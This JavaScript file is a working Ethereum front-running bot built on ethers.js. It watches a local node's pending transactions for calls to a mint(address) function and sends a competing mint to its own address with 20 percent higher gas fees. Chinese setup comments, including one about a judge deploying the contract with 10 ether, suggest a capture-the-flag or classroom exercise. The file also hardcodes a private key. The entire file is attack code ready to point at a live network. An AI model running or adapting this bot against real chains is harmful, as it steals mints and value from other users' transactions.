
const ethers = require('ethers');
const utils = ethers.utils;
/*
    1.url要替换——已解决
    2.chainID要替换——已解决
    3.privateKey要替换——已解决
    4.transferAddress要替换——已解决
    5.因为要保证初始合约中存在10 ether的余额，所以需要裁决方去部署初始的合约，并且裁决方至少要有10 ether传递给部署的合约。——已解决
*/

// 1. Create provider
var provider = new ethers.JsonRpcProvider("http://localhost:8545")


// 2. Create interface object for decoding transaction details.
// const iface = new utils.Interface(["function mint() external"]);
const iface = new ethers.Interface([
    "function mint(address _receiver) external",
])

// 3. Create wallet for sending frontrun transactions.
const privateKey =
    "0xc48398ed81a0124e2385f60fa2d77542b682427f7d171b1a89e5729903cb5989";
const wallet = new ethers.Wallet(privateKey, provider);
const transferAddress = "0x2b62cdfa480a825ed53aeeb7ff915fc93b5721b2";
console.log(wallet)

const main = async () => {
    // 4. Listen for pending mint transactions, get transaction details, and decode them.
    console.log("\n4. Listen for pending transactions, get txHash, and output transaction details.");
    console.log(iface.getFunction('mint', ['address']))
    // Listen module
    provider.on("pending", async txHash => {
        if (txHash) {
            // Get transaction details
            let tx = await provider.getTransaction(txHash);
            if (tx) {

                // Filter pendingTx.data
                // Transaction Analysis Module
                if (

                    tx.data.indexOf(iface.getFunction('mint', ['address']).selector) !== -1 &&
                    tx.from != wallet.address
                ) {
                    // Print txHash
                    console.log(
                        `\n[${new Date().toLocaleTimeString()}] Listening to Pending transaction: ${txHash} \r`,
                    );

                    // Print decoded transaction details
                    let parsedTx = iface.parseTransaction(tx);
                    console.log("Decoded pending transaction details:");
                    console.log(parsedTx);
                    // Decode input data
                    console.log("Raw transaction:");
                    console.log(tx);
                    console.log(tx.data);

                    // Front-running module
                    // Build frontrun tx
                    // fun_selector:0x6a627842
                    let func_selector = "0x6a627842";
                    let frontrunData = func_selector + transferAddress.slice(2).padStart(64, "0");
                    const txFrontrun = {
                        to: tx.to,
                        value: tx.value,
                        // maxPriorityFeePerGas: tx.maxPriorityFeePerGas * 10,
                        maxPriorityFeePerGas: tx.maxPriorityFeePerGas ? BigInt(tx.maxPriorityFeePerGas) * BigInt(12) / BigInt(10) : DEFAULT_VALUE,
                        // maxFeePerGas: tx.maxFeePerGas * 10,
                        maxFeePerGas: tx.maxFeePerGas ? BigInt(tx.maxFeePerGas) * BigInt(12) / BigInt(10) : DEFAULT_VALUE,
                        // gasLimit: tx.gasLimit * 5,
                        gasLimit: tx.gasLimit ? BigInt(tx.gasLimit) * BigInt(12) / BigInt(10) : tx.gasLimit,
                        data: frontrunData,
                    };
                    // Send frontrun transaction
                    var txResponse = await wallet.sendTransaction(txFrontrun);
                    console.log(`Sending frontrun transaction`);
                    await txResponse.wait();
                    console.log(`Frontrun transaction successful`);
                }
            }
        }
    });


};

main();